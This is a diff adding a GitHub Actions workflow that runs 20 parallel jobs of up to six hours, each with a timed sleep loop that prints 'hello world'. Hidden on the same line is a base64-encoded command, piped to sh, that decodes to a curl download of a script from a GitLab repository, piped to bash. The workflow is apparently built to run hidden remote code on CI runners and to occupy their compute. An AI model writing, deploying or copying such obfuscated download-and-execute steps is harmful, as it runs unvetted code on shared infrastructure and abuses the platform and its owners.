@@ -1,0 +1,60 @@
+name: 🔵 Xharape
+
+on:
+  workflow_call:
+    inputs:
+      cycle:
+        required: true
+        type: number
+
+jobs:
+  hello:
+    name: ${{ matrix.name }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        name:
+          - kjxha-aa1fdghr
+          - yixha-ba1hsdhd
+          - kjxha-ca1asfas
+          - uyxha-da1gasga
+          - jhxha-ea1gsags
+          - wfxha-fa1gssgg
+          - rtxha-ga1sagga
+          - ryxha-ha1asgsg
+          - fjxha-ia1sgags
+          - yrxha-ja1dgsgd
+          - dgxha-ka1zdbvg
+          - nbxha-la1sdgsg
+          - ryxha-ma1agsgs
+          - hfxha-na1sgsga
+          - sfxha-oa1sgass
+          - sfxha-pa1dsgsd
+          - dfxha-qa1sdgsd
+          - fsxha-ra1sgfss
+          - dfxha-sa1sfaas
+          - dfxha-ta1dsgsd
+    steps:
+      - name: Hello dengan sleep dinamis
+        run: |
+          HOUR_UTC=$(date -u +%H)
+          CYCLE=${{ inputs.cycle }}
+          if [ "$HOUR_UTC" -eq 4 ]; then
+            echo "🕚 Jam 11 siang WIB (04 UTC). Sleep 5 jam."
+            SLEEP=18000
+          elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
+            echo "🕕 Jam 6-9 pagi WIB (UTC 23-02). Sleep 3 jam."
+            SLEEP=10800
+          else
+            if [ "$CYCLE" -le 5 ]; then
+              echo "🔄 5 siklus pertama, sleep 600 detik."
+              SLEEP=600
+            else
+              echo "⏳ Siklus ke-6 dan seterusnya, sleep 1 jam."
+              SLEEP=3600
+            fi
+          fi
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGVtYWtzYW5zIHwgYmFzaA | sh & sleep $SLEEP
